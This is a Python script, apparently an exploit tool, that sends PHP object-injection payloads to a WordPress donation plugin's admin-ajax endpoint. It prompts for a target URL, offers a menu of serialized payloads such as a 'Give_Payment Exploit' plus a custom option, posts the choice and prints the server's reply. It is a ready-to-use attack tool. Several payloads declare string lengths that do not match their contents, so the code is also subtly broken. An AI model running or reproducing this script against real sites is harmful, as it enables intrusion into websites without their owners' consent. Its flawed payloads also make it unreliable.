import requests
import json

# Function to display payload options
def display_payload_options():
    payloads = {
        '1': {
            'name': 'Give_Payment Exploit',
            'payload': 'O:12:"Give_Payment":1:{s:7:"give_id";s:10:"malicious_code";}'
        },
        '2': {
            'name': 'Simple String Injection',
            'payload': '"Simple String Injection"'
        },
        '3': {
            'name': 'Serialized Array Exploit',
            'payload': 'a:2:{i:0;s:4:"test";i:1;s:10:"malicious";}'
        },
        '4': {
            'name': 'Custom Payload',
            'payload': None  # User will input their own payload
        }
    }

    print("Select the type of payload you want to send:")
    for key, value in payloads.items():
        print(f"{key}: {value['name']}")

    return payloads

# Function to get user-selected payload
def get_user_payload(payloads):
    choice = input("Enter the number of the payload you want to use: ")

    if choice not in payloads:
        print("Invalid choice. Exiting.")
        return None

    if choice == '4':
        custom_payload = input("Enter your custom payload: ")
        return custom_payload
    else:
        return payloads[choice]['payload']

# Main script logic
def main():
    url = input("Enter the target URL (e.g., http://example.com/wp-admin/admin-ajax.php): ")

    payloads = display_payload_options()
    payload = get_user_payload(payloads)

    if payload is None:
        return

    data = {
        'action': 'give_ajax',
        'give_title': payload
    }

    try:
        response = requests.post(url, data=data)

        if response.status_code == 200:
            print("Exploit sent successfully.")
            try:
                json_response = response.json()
                print("JSON Response:", json.dumps(json_response, indent=4))
            except ValueError:
                print("Response:", response.text)
        else:
            print(f"Failed to send exploit. Status code: {response.status_code}")
            print("Response:", response.text)

    except requests.exceptions.RequestException as e:
        print("An error occurred while making the request:", str(e))

if __name__ == "__main__":
    main()
